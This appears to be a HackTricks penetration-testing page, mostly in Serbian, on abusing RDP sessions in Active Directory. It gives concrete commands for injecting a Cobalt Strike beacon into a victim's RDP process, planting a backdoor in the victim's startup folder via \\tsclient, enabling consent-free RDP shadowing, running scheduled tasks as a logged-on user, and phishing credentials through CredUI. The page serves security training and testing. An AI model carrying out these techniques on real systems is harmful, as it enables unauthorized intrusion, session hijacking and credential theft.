# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ako **spoljna grupa** ima **RDP access** do bilo kog **računara** u trenutnom domenu, **attacker** bi mogao da **compromise** taj računar i čeka korisnika.

Kada taj korisnik pristupi putem RDP-a, **attacker** može da izvrši **pivot** u session tog korisnika i zloupotrebi njegove dozvole u spoljnom domenu.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Proverite **druge načine za krađu sesija pomoću drugih alata** [**na ovoj stranici.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Ako korisnik pristupi mašini putem **RDP-a** gde ga **attacker** **čeka**, attacker će moći da **inject a beacon u RDP sesiju korisnika**, a ako je **victim montirao svoj disk** prilikom pristupanja putem RDP-a, **attacker** bi mogao da mu pristupi.

U ovom slučaju možete jednostavno da **compromise-ujete** **originalni računar** **victim-a** tako što ćete upisati **backdoor** u **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Ako ste **local admin** na hostu na kojem žrtva već ima **active RDP session**, možda ćete moći da **pregledate/upravljate tom radnom površinom bez krađe lozinke ili dumping LSASS**.<sup>[[1]](#references)</sup>

Ovo zavisi od **Remote Desktop Services shadowing** policy-ja sačuvanog na:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Zanimljive vrednosti:

- `0`: Onemogućeno
- `1`: `EnableInputNotify` (kontrola, potrebno odobrenje korisnika)
- `2`: `EnableInputNoNotify` (kontrola, **nije potrebno odobrenje korisnika**)
- `3`: `EnableNoInputNotify` (samo za pregled, potrebno odobrenje korisnika)
- `4`: `EnableNoInputNoNotify` (samo za pregled, **nije potrebno odobrenje korisnika**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Ovo je naročito korisno kada je privilegovani korisnik povezan preko RDP-a ostavio otključanu radnu površinu, KeePass sesiju, MMC konzolu, sesiju browsera ili otvoren admin shell.

## Scheduled Tasks As Logged-On User

Ako ste **local admin**, a ciljni korisnik je **trenutno prijavljen**, Task Scheduler može pokrenuti code **kao taj korisnik bez njegove lozinke**.<sup>[[1]](#references)[[4]](#references)</sup>

Ovo pretvara postojeću logon sesiju žrtve u execution primitive:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Napomene:

- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku da bi kreirao task koji se izvršava kao taj korisnik.
- Ako je korisnik **prijavljen**, task može ponovo da koristi postojeći logon context.
- Ovo je praktičan način za izvršavanje GUI radnji ili pokretanje binarnih datoteka unutar sesije žrtve bez pristupanja LSASS-u.

## Zloupotreba CredUI Prompt-a iz sesije žrtve

Kada možete da izvršavate kod **unutar interaktivnog desktopa žrtve** (na primer putem **Shadow RDP-a** ili **scheduled task-a koji se izvršava kao taj korisnik**), možete prikazati **pravi Windows credential prompt** korišćenjem CredUI API-ja i prikupiti kredencijale koje žrtva unese.<sup>[[1]](#references)</sup>

Relevantni API-ji:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipičan tok:

1. Pokrenite binarnu datoteku u sesiji žrtve.
2. Prikažite prompt za autentifikaciju na domenu koji odgovara brendiranju trenutnog domena.
3. Raspakujte vraćeni auth buffer.
4. Validirajte navedene kredencijale i po potrebi nastavite sa prikazivanjem prompt-a dok se ne unesu važeći kredencijali.

Ovo je korisno za **phishing na hostu** zato što prompt prikazuju standardni Windows API-ji, umesto lažne HTML forme.

## Zahtevanje PFX-a u kontekstu žrtve

Isti primitiv **scheduled-task-as-user** može da se koristi za zahtevanje **sertifikata/PFX-a kao prijavljena žrtva**. Taj sertifikat se kasnije može koristiti za **AD autentifikaciju** kao taj korisnik, čime se krađa lozinke u potpunosti izbegava.<sup>[[1]](#references)[[5]](#references)</sup>

Tok na visokom nivou:

1. Steknite **local admin** privilegije na hostu na kojem je žrtva prijavljena.
2. Izvršite logiku za enrollment/export kao žrtva koristeći **scheduled task**.
3. Eksportujte dobijeni **PFX**.
4. Koristite PFX za PKINIT / autentifikaciju na AD-u zasnovanu na sertifikatu.

Pogledajte stranice o AD CS-u za naknadnu zloupotrebu:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Reference

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
